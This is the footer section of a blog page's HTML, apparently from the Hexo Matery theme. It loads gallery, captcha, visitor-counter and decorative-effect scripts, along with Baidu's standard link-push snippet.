    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    





<script src="/js/FunnyTitle.js"></script>
</body>

</html>
